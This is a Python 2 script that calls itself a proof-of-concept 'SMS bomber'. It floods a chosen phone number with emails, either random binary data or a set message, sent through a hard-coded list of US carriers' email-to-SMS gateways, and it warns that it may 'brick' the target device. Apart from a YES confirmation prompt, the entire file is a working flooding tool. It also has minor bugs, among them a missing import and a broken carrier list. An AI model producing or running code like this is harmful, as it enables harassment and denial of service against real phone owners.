#!/usr/bin/env python
'''
Proof-of-Concept (PoC) SMS bomber - showing implications of sms over IP

THIS WILL MAY DAMAGE THE RECEIVING DEVICE - PoC ONLY!
'''
import smtplib
import logging
import argparse
import time
from email.mime.text import MIMEText

#mail__server
mail_server = 'localhost'

#gateways
carrierGateways = {"att":"txt.att.net", "tmobile":"tmomail.net", "sprint":"pm.sprint.com", "virgin":"vmobl.com", 
		"tracfone":"mmst5.tracfone.com", "metropcs":"mymetropcs.com", "cricket":"sms.mycricket.com",
		"ptel":"ptel.com", "republic":"text.republicwireless.com", "suncom":"tms.suncom.com", "ting":"message.ting.com",
		"uscc":"email.uscc.net",  "cingular":"cingularme.com", "cpsire":"cspire1.com", "verizon":"vtext.com"}

#args
parser = argparse.ArgumentParser(description="PoC SMS Bomber")

parser.add_argument('-s', '--sender', dest='sender', help='Sender email address', required=True)
parser.add_argument('-t', '--target', dest='target', help='Target cellphone number (10-digits)', required=True)
parser.add_argument('-c', '--carrier', dest='carrier', help='Target cellphone carrier', choices=['att','tmobile','sprint' \
			'virgin', 'tracfone', 'metropcs', 'cricket','ptel','republic','suncom','ting','uscc','cingular','cspire','pageplus'], required=True)
parser.add_argument('-n', '--number', dest='number', help='Number of messages', type=int, required=True)
parser.add_argument('-m', '--message', dest='message', help='Message (optional - if blank random data is sent', required=False)

args = parser.parse_args()


if __name__ == "__main__":
	#init logger
	log = logging.getLogger("")
	log.setLevel(logging.DEBUG)
	log.addHandler(logging.FileHandler("smsBomberLog.txt"))
	
	#warning
	print "[!!!] WARNING - ARE YOU SURE YOU WANT TO RUN THIS SCRIPT?"
	print "RUNNING THIS WILL FLOOD A PHONE WITH MESSAGES AND POTENTIALLY BRICK IT"
	check = raw_input("If you are sure enter YES: ")

	if (check != "YES"):
		print "Check failed...exiting"
		sys.exit(0)

	#args
	sender = args.sender
	target = args.target
	carrier = args.carrier
	number = args.number
	if args.message:
		message = args.message
	else:
		message = None

	#Start...
	print "[+]Starting x%s SMS bomb of cell: %s" % (number, target)
	i = 0
	while  (i < number):
		#Load Message content
		if message:
			msg = MIMEText(message)
		else:
			with open("/dev/urandom", 'rb') as f:
				#msg = MIMEText(repr(f.read(255)))
				msg = MIMEText(f.read(255))
	
		msg['From'] = sender
		dest = target+'@'+carrierGateways[carrier]
		msg['To'] = dest

		try:
			#Send Email
			s = smtplib.SMTP(mail_server)
			s.sendmail(sender, [dest], msg.as_string())
			s.quit
			if (i % 10 == 0):
				print "[--]SMS sent! %s/%s" % (i, number)
		except Exception as e:
			print "ERROR - %s" % repr(e)
			log.error("ERROR: %s" % repr(e))
		i = i + 1

		#delay
		time.sleep(0.5)

	print  "SMS Bombing of %s Complete." % target

